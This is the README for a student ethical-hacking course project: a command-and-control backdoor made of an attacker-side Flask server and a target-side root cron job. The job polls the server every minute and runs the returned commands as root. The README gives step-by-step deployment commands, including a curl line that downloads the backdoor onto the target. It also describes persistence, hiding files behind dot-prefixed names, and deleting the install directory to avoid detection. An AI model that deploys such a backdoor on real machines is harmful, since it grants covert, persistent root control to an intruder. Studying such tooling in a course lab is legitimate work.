# Command-Control

## CS378 Ethical Hacking - Command and Control

David Trakhtengerts : dst726 and Ricky Woodruff : rgw664

## Install

### Attack Machine

1. Install dependencies

    ```bash
    cd server
    pip3 install -r requirements.txt
    ```
2. Generate a key pair
    
    Keys should be generated and stored in the `server` directory

    ```bash
    openssl genrsa -out private.pem 1024
    openssl rsa -in private.pem -pubout -out public.pem
    ```
3. Create a `commands.txt` file and fill it with commands to run on the target machine. Each command should be on a new line.

    ```bash
    echo $'pwd\nwhoami\nls' > commands.txt
    ```
4. Run the flask server

    ```bash
    export FLASK_APP=attacker-server.py
    flask run --host={Server IP} # server should be reachable from target machine
    # Example: flask run --host=10.0.2.4
    ```


### Target Machine

1. Download the backdoor repo

    ```bash
    curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
    ```
2. From the **attacker machine**, manually copy the contents of public key (`public.pem`) to the `/client` directory on the **target machine**. The new public key should also be named `public.pem`.
    
3. Run the setup script

    ```bash
    cd Command-Control-main/client
    chmod +x setup.sh
    ./setup.sh {Your Server Endpoint}
    # Example: ./setup.sh http://10.0.2.4:5000/commands
    ```
4. Done!

    The cronjob will start running every minute. It will call your server endpoint for commands and execute them as root. If you want to view the results,
    you can check the `.cronlog.txt` file in the `/var/spool/cron` directory on the **target machine**:
    
    ```bash
    cat /var/spool/cron/.cronlog.txt
    ```
    
    Additionally, you may delete the `Command-Control-main` directory to avoid detection on the target machine.



## How it works

There are two parts to this backdoor, the flask server on the attacker side and the cron job on the target side.

### Cron job

The cron job runs every minute and calls a python script which makes a request to the `/commands` endpoint on the flask server. The server returns a signature and the commands to run. The signature will be verified using the public key and if it is valid, the commands will be run. The output of the commands is forwarded to a log file on the target machine.

### Flask Server

The flask server has one endpoint, `/commands`. This endpoint is used to send commands to the target machine.
The server reads the commands from a file `commands.txt`, and deletes the contents after (to avoid re-executing commands). It then signs the commands with a private key, and sends the signature along with the commands to the target machine.


## How it meets the requirements

1. Provide remote root shell access
    - The attacker can write commands in a file on a machine and the target machine will execute those commands.
2. Persistence
    - The target machine can reboot, and this backdoor will persist automatically because cron jobs are run on boot by default.
3. Configuration
    - The attacker can add commands to the file on their machine.
    - The attacker can configure the server ip, port, and endpoint that the commands come from.
4. Authentication
    - The attacker and target machines use a public/private key pair to authenticate each other.
    - Only the attacker who created the key pair will be able to send commands to the target machine.
5. Hiding
    - Cron job is only visible to root users (typically)
    - All cron related files are hidden by a period in front of the file name to hide from simple `ls` commands

## Detection

- At the user level there is no way to detect this backdoor because users do not have access to the cron directory.
- Root users can see the cron job, .cron.py (if they look closely), and the log file.
